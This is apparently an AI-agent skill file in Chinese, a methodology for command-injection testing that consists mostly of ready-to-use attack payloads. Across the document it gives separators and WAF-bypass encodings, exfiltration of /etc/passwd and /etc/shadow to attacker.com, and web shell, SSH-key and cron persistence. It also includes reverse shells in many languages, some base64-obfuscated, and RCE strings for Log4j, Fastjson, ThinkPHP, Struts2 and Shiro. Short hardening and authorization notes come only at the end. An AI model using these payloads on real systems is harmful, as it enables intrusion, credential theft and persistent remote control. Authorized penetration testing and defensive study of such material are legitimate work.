---
name: command-injection-testing
description: 命令注入漏洞测试的专业技能和方法论
version: 1.0.0
---

# 命令注入漏洞测试

## 概述

命令注入（Command Injection）是一种通过应用程序执行系统命令的安全漏洞。当应用程序将用户输入直接传递给系统命令解析器时，攻击者能够注入并执行任意命令。本技能覆盖从基础检测到高级利用的完整方法论，适用于授权渗透测试和红队评估。

---

## 1. 基础检测Payload

### 1.1 命令分隔符速查

| 分隔符 | Linux | Windows | 说明 |
|--------|-------|---------|------|
| `;` | 是 | 是 | 命令顺序执行，无视前一条结果 |
| `\|` | 是 | 是 | 管道，前一条输出作为后一条输入 |
| `||` | 是 | 是 | 逻辑或，前一条失败才执行后一条 |
| `&` | 是 | 是 | 后台执行 |
| `&&` | 是 | 是 | 逻辑与，前一条成功才执行后一条 |
| `` `cmd` `` | 是 | 否 | 命令替换，C Shell 风格 |
| `$(cmd)` | 是 | 否 (部分新版支持) | 命令替换，Bash 风格 |
| `%0a` | 是 | 否 (URL 编码换行) | 换行符注入 |
| `%0d%0a` | 是 | 是 | CRLF 注入，部分后端解析 |

### 1.2 通用检测模板

```bash
# 基础存活检测 — 使用 sleep / ping 构造时间差
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
127.0.0.1 `sleep 5`
127.0.0.1 $(sleep 5)

# HTTP Referer / User-Agent / Cookie 头注入测试
User-Agent: Mozilla/5.0 $(sleep 5)

# 配合时间戳验证
127.0.0.1; echo INJECTED_$(date +%s)
```

### 1.3 输出回显检测

```bash
# 通过 echo / print 在响应中留下唯一标记
127.0.0.1; echo VULN_CHECK_12345
127.0.0.1 && echo VULN_CHECK_12345
127.0.0.1 | echo VULN_CHECK_12345

# Windows 环境
127.0.0.1 & echo VULN_CHECK_12345
127.0.0.1 || echo VULN_CHECK_12345
```

### 1.4 参数位置覆盖

```bash
# GET 参数
?ip=127.0.0.1;id
?host=127.0.0.1|whoami

# POST 参数
ip=127.0.0.1%0aid

# JSON body — 当服务端反序列化后拼接到命令时
{"ip": "127.0.0.1; id"}

# Multipart
filename="test.txt; id"
```

---

## 2. 无回显数据外带

当命令执行结果不直接返回给用户时，通过带外（Out-of-Band）渠道获取数据。

### 2.1 DNS 外带

利用 DNS 查询日志记录，将数据编码到子域名中发送到攻击者控制的 DNS 服务器。

```bash
# 使用 nslookup (Linux/Windows)
127.0.0.1; nslookup `whoami`.attacker.com
127.0.0.1; nslookup $(whoami).attacker.com

# 使用 dig (Linux)
127.0.0.1; dig +short `whoami`.attacker.com
127.0.0.1; dig $(hostname).attacker.com A +short

# 使用 host (Linux)
127.0.0.1; host `whoami`.attacker.com

# 逐字符外带 (绕过长度限制)
for i in $(cat /etc/passwd | base64 -w0 | fold -w30); do nslookup $i.attacker.com; done

# Windows PowerShell DNS 外带
127.0.0.1 & powershell -c "$env:computername; $env:username"
127.0.0.1 & nslookup %username%.attacker.com
```

### 2.2 HTTP 外带

通过 HTTP/HTTPS 请求将数据发送到攻击者的监听服务器。

```bash
# curl (Linux)
127.0.0.1; curl http://attacker.com/$(whoami)
127.0.0.1; curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/exfil
127.0.0.1; curl --data-urlencode "data=$(cat /etc/shadow | base64)" http://attacker.com/

# wget (Linux)
127.0.0.1; wget --post-data="user=$(whoami)" http://attacker.com/
127.0.0.1; wget http://attacker.com/$(hostname)/$(whoami)

# Windows certutil / bitsadmin / mshta
127.0.0.1 & certutil -urlcache -split -f http://attacker.com/payload.exe %TEMP%\p.exe
127.0.0.1 & bitsadmin /transfer job /download /priority high http://attacker.com/data %TEMP%\out.txt
127.0.0.1 & mshta http://attacker.com/payload.hta

# PowerShell HTTP 外带 (Windows)
127.0.0.1 & powershell -c "Invoke-WebRequest -Uri http://attacker.com/ -Method POST -Body (Get-Content C:\Users\Administrator\flag.txt -Raw)"
127.0.0.1 & powershell -c "(New-Object Net.WebClient).DownloadString('http://attacker.com/exfil?data=' + [Environment]::UserName)"
```

### 2.3 ICMP 外带

```bash
# 使用 ping 将数据编码到 ICMP 包中 (需要 tcpdump 监听)
127.0.0.1; ping -c 1 $(whoami | xxd -p).attacker.com
```

### 2.4 接收端准备

```bash
# Python HTTP 服务器接收外带数据
python3 -m http.server 80

# nc 监听原始 HTTP 请求
nc -lvnp 80

# tcpdump 监听 DNS 查询
tcpdump -i eth0 port 53 -A
```

---

## 3. 不出网时间盲注 + 写文件

当目标无法出网（无 DNS 外带、无 HTTP 外带通道）时，通过时间延迟盲注或在本地写入文件来验证和利用。

### 3.1 时间盲注 (Time-Based Blind Injection)

利用 sleep 或计算密集型操作构造条件延时，逐字符推断数据。

```bash
# 基础延时验证
127.0.0.1; sleep 5

# 布尔条件盲注
127.0.0.1; if [ $(whoami | cut -c1) == 'r' ]; then sleep 5; fi

# MySQL 时间延迟 (如果命令注入被用于 MySQL 查询上下文)
'; IF (SUBSTRING(user(),1,1)='r', SLEEP(5), 0) --

# 逐字符猜解
127.0.0.1; if [ $(cat /etc/passwd | grep root | wc -c) -gt 10 ]; then sleep 3; fi

# 使用 ping 替代 sleep (Windows 无 sleep 命令)
127.0.0.1 & ping -n 5 127.0.0.1
```

### 3.2 写入文件到 Web 目录

将文件写入 Web 可访问目录，通过 HTTP 直接访问。

```bash
# Linux — 写入 PHP WebShell
127.0.0.1; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
127.0.0.1; printf '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
127.0.0.1; echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ | base64 -d > /var/www/html/s.php

# Windows — 写入 ASPX WebShell
127.0.0.1 & echo ^<%@ Page Language="C#"^>^<script runat="server"^>System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"])^</script^> > C:\inetpub\wwwroot\cmd.aspx

# 使用脚本语言写文件 (无 echo 限制时)
127.0.0.1; python3 -c "open('/var/www/html/x.php','w').write('<?php system(\$_GET[\"c\"]);?>')"
127.0.0.1; perl -e 'system("echo \\"<?php system(\\$_GET[\\\"c\\\"]);?>\\" > /var/www/html/x.php")'
```

### 3.3 写入 SSH 密钥 (持久化访问)

```bash
# 追加公钥到 authorized_keys
127.0.0.1; echo "ssh-rsa AAAAB3NzaC1..." >> ~/.ssh/authorized_keys
```

### 3.4 写入计划任务/Cron (反弹 Shell)

```bash
# Linux cron
127.0.0.1; (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# Windows 计划任务
127.0.0.1 & schtasks /create /tn "Updater" /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" /sc ONLOGON /ru SYSTEM
```

### 3.5 启动持久监听服务 (目标有公网口时)

```bash
# socat 创建反向隧道
127.0.0.1; socat TCP-LISTEN:8888,reuseaddr,fork EXEC:/bin/sh &
```

---

## 4. 反弹 Shell 大全

所有 Payload 中的 `attacker.com` 和 `4444` 替换为实际监听地址和端口。

### 4.1 Bash

```bash
# 经典 Bash 反弹
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# 编码变体 (绕过关键词过滤)
/bin/bash -c 'exec bash -i &>/dev/tcp/attacker.com/4444 <&1'

# 使用 exec
exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# 避免 /dev/tcp (编译时未启用)
mkfifo /tmp/s; nc attacker.com 4444 </tmp/s | /bin/sh >/tmp/s 2>&1; rm /tmp/s
```

### 4.2 Python

```python
# Python2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 单行编码 (适用于空格过滤场景)
python3 -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoImF0dGFja2VyLmNvbSIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ=='.decode())"
```

### 4.3 PHP

```php
# PHP exec 反弹
php -r '$s=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP shell_exec 反弹
php -r '$s=fsockopen("attacker.com",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP system 反弹
php -r '$s=fsockopen("attacker.com",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

### 4.4 Netcat (nc)

```bash
# 原生 nc -e 模式 (支持 -e 的版本)
nc -e /bin/sh attacker.com 4444
nc -e /bin/bash attacker.com 4444

# 无 -e 模式 (传统 nc 回连)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f

# ncat (nmap 套件)
ncat --ssl attacker.com 4444 -e /bin/sh
```

### 4.5 PowerShell

```powershell
# 完整 TCP 反弹
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell base64 编码 Payload
powershell -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=

# PowerShell SSL/TLS 反弹 (绕过 HTTP 过滤)
powershell -nop -c "$TCPClient = New-Object Net.Sockets.TCPClient('attacker.com',4444);$SSLStream = New-Object Net.Security.SslStream($TCPClient.GetStream(),$false);$SSLStream.AuthenticateAsClient('attacker.com');$StreamWriter = New-Object IO.StreamWriter($SSLStream);$StreamWriter.Write('PS '+(Get-Location).Path+'> ');while(($cmd = $StreamWriter.ReadLine()) -ne 'exit'){$Out = (iex $cmd 2>&1 | Out-String);$StreamWriter.Write($Out);$StreamWriter.Flush()};$TCPClient.Close()"
```

### 4.6 Perl

```perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 4.7 Ruby

```ruby
ruby -rsocket -e 'c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");loop{c.puts `#{c.gets}`}'
```

### 4.8 Lua

```lua
lua -e 'require("socket");require("os");t=socket.tcp();t:connect("attacker.com","4444");os.execute("/bin/sh -i <&3 >&3 2>&3");'
```

### 4.9 Golang

```go
# 编译前替换 attacker.com 和 4444
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","attacker.com:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
```

### 4.10 Telnet

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet attacker.com 4444 0</tmp/p | /bin/sh 1>/tmp/p
```

### 4.11 Awk

```bash
awk 'BEGIN{s="/inet/tcp/0/attacker.com/4444";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

### 4.12 Socat

```bash
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
```

---

## 5. 监听端设置

### 5.1 nc (Netcat) 监听

```bash
# 基础监听
nc -lvnp 4444

# 带 SSL 支持 (ncat)
ncat --ssl -lvnp 4444

# 持续监听 (重启后保留)
while true; do nc -lvnp 4444; done
```

### 5.2 pwncat-cs 监听

```bash
# 安装
pip install pwncat-cs

# 启动监听 (自动完成 TTY 升级、文件传输、执行命令记录)
pwncat-cs -lp 4444

# 平台指定监听
pwncat-cs -lp 4444 --platform linux

# 使用 module 进行后渗透收集
pwncat-cs -lp 4444
# (连接后) Ctrl+D -> modules -> enumerate -> run all
```

### 5.3 msfconsole (Metasploit) 监听

```bash
# 启动 msfconsole
msfconsole -q

# 通用 payload 处理
use exploit/multi/handler
set PAYLOAD linux/x64/shell/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run

# Windows Meterpreter
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Linux Meterpreter
set PAYLOAD linux/x64/meterpreter/reverse_tcp

# PHP Meterpreter
set PAYLOAD php/meterpreter_reverse_tcp

# Python Meterpreter
set PAYLOAD python/meterpreter_reverse_tcp
```

### 5.4 socat 监听

```bash
# 基础监听
socat TCP-LISTEN:4444,reuseaddr,fork -

# SSL 加密监听 (生成证书)
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork,reuseaddr STDOUT

# PTY 交互式监听
socat TCP-LISTEN:4444,reuseaddr,fork PTY,raw,echo=0
```

### 5.5 多路复用监听 (同时监听多个端口)

```bash
# tmux 分屏监听多个端口
tmux new-session -d -s listener 'nc -lvnp 4444'
tmux split-window -h 'nc -lvnp 4445'
tmux split-window -v 'nc -lvnp 4446'
tmux attach -t listener
```

---

## 6. TTY 升级

从受限的 Shell (非交互式、无环境变量) 升级为完整交互式 TTY。

### 6.1 Python PTY 升级

```bash
# Python 标准方法
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 完整步骤 (两步法)
# 受害者上执行:
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 攻击者上执行 (Ctrl+Z 挂起会话后):
stty raw -echo; fg
# 然后输入 reset 并按回车

# 受害者上继续执行:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 cols 180
```

### 6.2 script 命令

```bash
# 使用 script 创建 PTY
script /dev/null -c bash
# 或
script -q /dev/null
```

### 6.3 socat PTY 升级

```bash
# 攻击者监听
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# 受害者连接
socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:attacker.com:4444
```

### 6.4 expect 工具

```bash
expect -c 'spawn bash; interact'
```

### 6.5 stty 配置辅助

```bash
# 在攻击机获取当前终端大小 (在攻击机执行)
stty -a

# 在反弹 Shell 中设置 (根据 stty -a 结果)
stty rows 40 cols 180
```

### 6.6 Windows 环境 (非 TTY, 使用 PowerShell 全功能)

```powershell
# 在反弹 Shell 中设置执行策略
powershell -c Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# 导入模块 (如果需要)
powershell -c Import-Module .\PowerView.ps1
```

---

## 7. 常见应用 RCE

### 7.1 Apache Struts2

```bash
# S2-045 (Content-Type)
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess? ...
Accept: ../../../../../../etc/passwd

# S2-046 (Content-Disposition filename)
Content-Disposition: form-data; name="upload"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):...
```

### 7.2 ThinkPHP

```bash
# ThinkPHP 5.x RCE
http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

# ThinkPHP 5.x 任意方法调用
http://target.com/index.php?s=captcha&a=check&captcha=123&method=GET

# ThinkPHP 6.x RCE
http://target.com/index.php?s=index/index&a=index
POST data: _method=__call&method=index&filter[]=system&name[]=id
```

### 7.3 Fastjson

```bash
# 利用 AutoType 反序列化
POST / HTTP/1.1
Content-Type: application/json

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

# RMI 利用方式
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com:1099/Exploit","autoCommit":true}

# 检测是否存在 AutoType (DNS 外带)
{"@type":"java.net.Inet4Address","val":"dnslog-token.attacker.com"}
```

### 7.4 Apache Log4j (CVE-2021-44228)

```bash
# JNDI 注入 (LDAP)
${jndi:ldap://attacker.com:1389/exploit}

# JNDI 注入 (RMI)
${jndi:rmi://attacker.com:1099/exploit}

# DNS 探测 (无恶意服务器也可验证)
${jndi:dns://attacker.com/log4j-test}

# 绕过引号/括号限制
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}ldap://attacker.com:1389/exploit}

# 使用 lower/upper 绕过
${${lower:j}ndi:${lower:l}dap://attacker.com:1389/exploit}

# Bypass WAF 使用编码
${::-j}ndi:ldap://attacker.com:1389/exploit

# 常见请求头注入点
X-Forwarded-For: ${jndi:ldap://attacker.com/exploit}
User-Agent: ${jndi:ldap://attacker.com/exploit}
Referer: ${jndi:ldap://attacker.com/exploit}
Cookie: session=${jndi:ldap://attacker.com/exploit}
```

### 7.5 Apache Shiro

```bash
# Shiro RememberMe 反序列化
# 使用 ysoserial 生成 Payload
java -jar ysoserial-all.jar CommonsBeanutils1 "ping -c 3 $(whoami).attacker.com" > payload.ser
# 使用 Shiro 密钥 (常见默认密钥: kPH+bIxk5D2deZiIxcaaaA==) 加密
python shiro_tool.py encrypt --key kPH+bIxk5D2deZiIxcaaaA== payload.ser

# 常见默认密钥
kPH+bIxk5D2deZiIxcaaaA==
2AvVhdsgUs0FSA3SDFAdag==
fCq+/xW488hMTCD+cmJ3aQ==
0AvVhmFLUs0KTA3Kprsdag==
```

### 7.6 其他常见 RCE

```bash
# Spring Framework (Spring4Shell CVE-2022-22965)
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22x%22.equals(%22x%22))%7B%20Runtime.getRuntime().exec(%22id%22);%7D%20%25%7Bc2%7Di

# Jenkins
http://target.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
POST sandbox=true&value=println"id".execute().text

# Wordpress (wp-admin)
http://target.com/wp-admin/admin-ajax.php?action=wp-compression-test&file=../../../../../../etc/passwd
```

---

## 8. WAF / 参数过滤绕过

### 8.1 空格过滤绕过

```bash
# ${IFS} (Bash 内部字段分隔符)
${IFS}id
${IFS}cat${IFS}/etc/passwd

# 使用 Tab (%09)
127.0.0.1%09;%09id
127.0.0.1%09||%09id

# 大括号扩展
{cat,/etc/passwd}
{ls,-la}

# 使用 <> 重定向
</etc/passwd cat
cat<>/etc/passwd

# $IFS$9 技巧
cat$IFS$9/etc/passwd
$IFS$9id
```

### 8.2 命令分隔符绕过

```bash
# 换行符绕过 (%0a, %0d%0a)
127.0.0.1%0aid
127.0.0.1%0d%0aid

# 注释符截断
127.0.0.1; id # no-op
127.0.0.1; id %23

# 空字节截断 (%00)
127.0.0.1%00; id

# URL 编码分隔符
%3b -> ;
%26 -> &
%7c -> |
%26%26 -> &&
%7c%7c -> ||

# 双 URL 编码
%253b -> %3b -> ;
```

### 8.3 关键词过滤绕过

```bash
# 单引号插入
w'h'o'a'm'i
c'a't /etc'/'passwd

# 双引号插入
w"h"o"a"m"i
c"a"t /etc/passwd

# 反斜杠插入
w\ho\am\i
c\at /etc/passwd

# 大小写混淆 (仅 Windows)
WhoAmI
CAT /etc/passwd

# 变量拼接
a=w;b=h;c=o;d=a;e=m;f=i;$a$b$c$d$e$f
a=ca;b=t;$a$b /etc/passwd

# 环境变量截取
${PATH:0:1} # 提取路径第一个字符
${HOME:0:1}
```

### 8.4 通配符 / 正则绕过

```bash
# 使用 ? 匹配单个字符
/c?t /etc/passwd
/usr/bin/ca? /etc/passwd

# 使用 * 匹配任意字符
/usr/bin/ca* /etc/passwd
/bin/ca* /etc/passwd

# 使用 [] 范围匹配
/bin/c[a]t /etc/passwd
/[b]in/cat /etc/passwd

# 字符集匹配
/usr/bin/c[a-t] /etc/passwd
/bin/c{a,t} /etc/passwd
```

### 8.5 编码绕过

```bash
# Base64 编码
echo "d2hvYW1p" | base64 -d | bash
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
$(echo "d2hvYW1p" | base64 -d)
`echo "d2hvYW1p" | base64 -d`

# Hex 编码
echo "77686f616d69" | xxd -r -p | bash
echo "77686f616d69" | perl -pe 's/(..)/chr(hex($1))/ge' | bash
$(printf "\x77\x68\x6f\x61\x6d\x69")

# Octal 编码 (八进制)
$'\167\150\157\141\155\151'
$(printf "\167\150\157\141\155\151")

# Unicode 编码 (部分环境)
whoami
```

### 8.6 大小写 + ROt13 绕过

```bash
# tr 转换大小写
$(echo "VUBZNVZ" | tr 'A-Za-z' 'N-ZA-Mn-za-m')  # whoami

# rev 反转字符串
echo "imahow" | rev
```

### 8.7 拼接绕过 (分段执行)

```bash
# 分块写入再执行
echo 'cat /etc' > /tmp/a
echo '/passwd' >> /tmp/a
sh /tmp/a

# 使用 xargs
echo 'whoami' | xargs bash

# 使用 eval
eval $(echo "d2hvYW1p" | base64 -d)
```

### 8.8 无回显场景命令执行确认

```bash
# 写入文件验证
| echo EXECUTED > /tmp/test.txt

# 触发 HTTP 请求确认
| curl http://attacker.com/exec_$(uname)

# 使用 DNS 查询确认
| nslookup $(hostname).attacker.com
```

### 8.9 长度限制绕过 (< 字符限制)

```bash
# 利用 wget/curl 下载脚本执行
curl attacker.com/s|bash

# 分段写入
echo "id" > /tmp/c
sh /tmp/c

# 使用短命令
ls>/tmp/a
cat /tmp/a
```

### 8.10 HTTP 参数污染绕过

```bash
# 重复参数 (部分框架取第一个/最后一个/拼接)
?cmd=id&cmd=whoami
?ip=127.0.0.1;id&ip=127.0.0.1

# 混合 GET/POST
GET: ?ip=127.0.0.1
POST: ip=;id
```

---

## 工具使用

### Commix

```bash
# 基础扫描
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# 指定注入点
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# 提取 Shell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell

# 批量测试
python commix.py -l request.txt --batch
```

### Burp Suite 配合

1. 拦截请求，发送到 Intruder / Repeater
2. 使用命令注入 Payload 字典 (可自定义)
3. 观察响应长度 / 状态码 / 时间延迟差异
4. 使用 Collaborator Client 检测 OOB 注入

### Nuclei 模板

```yaml
id: command-injection-generic
info:
  name: Generic Command Injection
  severity: critical
requests:
  - method: GET
    path:
      - "{{BaseURL}}?cmd=echo%20VULN_CHECK_12345"
    matchers:
      - type: word
        words:
          - "VULN_CHECK_12345"
```

---

## 验证和报告

### 验证步骤

1. 确认命令执行存在 (时间延迟/输出回显/OOB)
2. 确认执行上下文 (用户、权限、容器、操作系统)
3. 枚举系统信息 (OS版本、内核、安装的软件、网络)
4. 评估影响范围 (敏感文件、数据库、内网穿透能力)
5. 记录完整的 Proof of Concept (POC)

### 报告要点

- 漏洞位置和触发参数 (GET/POST/Header/Cookie)
- 注入的精确 Payload 和分隔符类型
- 可执行的命令范围及权限
- 影响分析 (数据泄露、横向移动、持久化)
- 修复建议 (参数化API、白名单验证、最小权限)

---

## 防护措施

### 推荐加固方案

1. **避免直接执行系统命令**
   - 使用语言内置 API 替代系统命令调用
   - 使用库函数 (如 PHP `filter_var` 验证 IP)

2. **严格的输入验证**
   - 白名单验证，拒绝所有未明确允许的输入
   - 正则校验输入格式，丢弃非常规字符

3. **参数化命令执行**
   - 使用 `subprocess.call(['command', 'arg1'])` 而非拼接字符串
   - 禁止通过 shell=True 调用

4. **最小权限原则**
   - 应用进程使用低权限用户运行
   - 禁止 Web 容器以 root 运行
   - 配合 chroot / 容器化隔离

5. **WAF / RASP 部署**
   - 部署 Web 应用防火墙，拦截已知注入模式
   - 运行时自保护 (RASP) 监控系统调用链

6. **日志与监控**
   - 记录所有命令执行操作
   - 监控异常的子进程创建和外连行为

---

## 注意事项

- 仅在获得书面授权的目标上进行测试
- 反弹 Shell 操作可能触发 EDR/AV 告警，提前确认测试范围
- 不同操作系统命令语法有显著差异 (Linux vs Windows)
- 避免在高可用生产环境执行破坏性命令 (rm -rf, dd, reboot)
- 测试完毕后清理写入的文件、计划任务、ssh 密钥等痕迹
- 注意记录所有操作，便于审计和复现
